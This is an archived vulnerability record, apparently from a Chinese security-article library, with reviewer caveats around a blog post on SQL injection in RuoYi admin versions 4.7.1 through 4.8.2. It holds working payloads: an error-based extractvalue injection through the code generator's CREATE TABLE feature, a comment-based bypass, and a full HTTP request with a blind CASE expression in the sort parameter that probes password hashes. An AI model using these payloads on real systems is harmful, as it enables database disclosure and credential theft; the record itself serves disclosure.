---
source: "gelusus/wxvl 公众号漏洞文库"
product: "RuoYi/建表及排序SQL"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "RuoYi 后台SQL注入漏洞系列2"
prerequisites: "来源所述条件，未列明部分仍待核：4.7.1–4.7.4、4.7.5、4.8.2分别不同入口，无修复公告"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0810dd3d90ba835b9c180950"
entity_id: "ve-0810dd3d90ba835b9c180950"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.7.1–4.7.4、4.7.5、4.8.2分别不同入口，无修复公告

代码与实验材料：CREATE TABLE SELECT错误注入和4.8.2 CASE排序请求，结果仅截图，无控制器/权限或对照

来源证据范围：安全艺术原创便笺无源码commit/官方来源

- **适用与权限边界（1）**：任意SQL功能与越权注入边界未说明；依据：代码生成创建本来处理DDL，需要说明仅授权CREATE的防护如何被绕过，而非执行SQL即漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（2）**：多个机制未拆分且身份材料未占位；依据：4.8.2 isAsc排序信道不同于createTable；保留完整JSESSIONID与CSRF令牌。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  RuoYi 后台SQL注入漏洞系列2  
安全艺术  安全艺术   2026-01-09 08:50  
  
# 1. RuoYi（4.7.1-4.7.4）  
## 1.1. SQL注入  
  
代码生成-创建  
```
CREATE table a1 as SELECT extractvalue(1,concat(0x7e,(select database())));
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp8ZlnXxsAmO3Pe4YGQeX2ZUZAlEiayFgD0ewXzicaYhvyqiayMlMviaEXNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpxXxU0OJFxtRwwAoQzTXnWpXyrpTVueiaIgJHLg46GJXmedLmI5c7PmQ/640?wx_fmt=png&from=appmsg "")  
# 2. RuoYi-4.7.5  
## 2.1. SQL注入  
  
代码生成-创建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp9xEyPfjY2VSY4xDKU7axUZyS4EZ26wUiaFqhSxFU0FjH7IE71fVAtxw/640?wx_fmt=png&from=appmsg "")  
  
绕过  
```
CREATE table a1 as SELECT/**/extractvalue(1,concat(0x7e,(select/**/database())));
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpr6INqH5QEabcPaokHoJHKURdDYg5WZhfHplK0h7vwyIE3qql2oyX1Q/640?wx_fmt=png&from=appmsg "")  
# 3. RuoYi-4.8.2  
## 3.1. SQL注入  
```
POST /system/user/list HTTP/1.1
Host: 192.168.3.102
Content-Length: 147
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
X-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.3.102
Referer: http://192.168.3.102/tool/gen/createTable
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=062******************************1ea
Connection: keep-alive

pageNum=1&pageSize=10&orderByColumn=status&isAsc=,CASE WHEN u.user_id LIKE 2 THEN CASE WHEN u.password LIKE 0x24326125 THEN 0 ELSE 2 END ELSE 1 END
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp7ODRRNtAL8rbIdZjRDjSJ6AzgGzaHlWUVggqDMShay5wurDY4syIyA/640?wx_fmt=png&from=appmsg "")  
  
更多内容进群了解哈。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OrPlho8vhCVYz7j2m9wiatMmeKTk7X3xzTFjnTrkSiaLqCMmByZxL4Z15HXV5R0Da0n6kKJSDwicLzuQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=24 "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
